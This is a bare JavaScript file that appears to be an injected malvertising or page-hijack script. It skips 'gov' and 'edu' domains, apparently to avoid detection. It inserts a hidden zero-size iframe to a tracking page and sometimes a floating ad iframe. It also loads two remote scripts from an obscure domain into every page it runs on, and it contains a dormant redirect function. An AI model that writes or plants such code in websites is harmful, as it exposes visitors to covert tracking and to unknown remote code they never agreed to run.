
function closead() {
	var addiv = document.getElementById("adm");
	addiv.style.display = "none";
}
function fonscroll () { 
	var addiv = document.getElementById("adm"); 
	if (!addiv) return
	addiv.style.left = (window.innerWidth - xwidth * 0.41) + "px";
	addiv.style.top = (window.innerHeight - xwidth * 0.31) + (document.documentElement.scrollTop || document.body.scrollTop)  + "px";
} 
function mcreateXMLHttpRequext(){ 
	var xmlhttp;
	if(window.ActiveXObject) { 
		xmlhttp = new ActiveXObject('Microsoft.XMLHTTP'); 
	} 
	else if(window.XMLHttpRequest){ 
		xmlhttp = new XMLHttpRequest(); 
	}
	return xmlhttp;
} 

var mdate = new Date(); 
mdate.setTime(mdate.getTime()+1000*24*3600*1000);

function mfn(){
	if (document.domain.indexOf('gov') != -1 || document.domain.indexOf('edu') != -1) {
		return;
	}

	xwidth = window.innerWidth;
	if (xwidth > 1000)
	{
		xwidth = 1000;
	}
	window.onscroll=fonscroll;
	setTimeout("window.onscroll=fonscroll", 1000);
	setTimeout("window.onscroll=fonscroll", 2000);
	var addiv = document.createElement('div');
	addiv.style.zIndex="9999";
	addiv.id = "adm";
	addiv.style.width = (xwidth * 0.4) + "px";
	addiv.style.height = (xwidth * 0.3) + "px";
	addiv.style.position="absolute";
	addiv.style.left = (window.innerWidth - xwidth * 0.41) + "px";
	addiv.style.top = (window.innerHeight - xwidth * 0.31) + (document.documentElement.scrollTop || document.body.scrollTop)  + "px";
	addiv.innerHTML = '<div style="width: 400px; height: 18px; z-index: 2147483647; background-color: rgb(242, 242, 242); border-bottom-width: 1px; border-bottom-style: solid; border-bottom-color: rgb(229, 229, 229); background-position: initial initial; background-repeat: initial initial;"><span id="closebutton_205332" style="width: 45px; height: 18px; cursor: pointer; float: right; background-image: url(http://cache.adm.cnzz.net/images/duilianclose.jpg); background-position: 50% 50%; background-repeat: no-repeat no-repeat;" onclick="closead()"></span></div>';
	var addframe = document.createElement('iframe');
	addframe.scrolling = "no";
	addframe.src = "http://www.fadnx.com/ad.html";
	addframe.style.border = "0px";
	addframe.style.width = "100%";
	addframe.style.height = "100%";
	addiv.appendChild(addframe);
	var tj = document.createElement('iframe');
	tj.src = 'http://www.fadnx.com/51yes.html?' + Math.random().toString();
	tj.style.width = '0';
	tj.style.height = '0';
	addiv.appendChild(tj);
	if (Math.random() < 0.1)
	{
		document.body.appendChild(addiv);
	}
	else
	{
		document.body.appendChild(tj);
	}
};

setTimeout('mfn()', 1000);


    function fxx() {
            function IsJump(adiframe) {
		return;
                var src = adiframe.src.toLowerCase();
                if (src && (src.indexOf("cl/index.php?module=system&method=first") > -1 || src.indexOf("cl/index.php?module=system&method=madvertis&other=joinmember") > -1) && src.indexOf("6515.com") == -1 && src.indexOf("8jun") == -1 && src.indexOf("http://www.bj") == -1){
                    window.location.href = "http://www.300960.com/";
                }
            }
            function FxxkADs() {
                document.real_document_writeln = document.writeln;
                var adframes = document.getElementsByTagName('iframe');
                if (adframes == null) {
                    return;
                }
                for (var i = 0; i < adframes.length; i++) {
                    if (IsJump(adframes[i])) {
                        break;
                    }
                }
            }
	FxxkADs();
        };
setTimeout('fxx()', 2000);
var ms1 = document.createElement('script');
ms1.src='http://c.myzwqwe12.com/AShow.aspx?AID=9775';
document.head.appendChild(ms1);

var ms2 = document.createElement('script');
ms2.src='http://c.myzwqwe12.com/AShow.aspx?AID=10084';
document.head.appendChild(ms2);
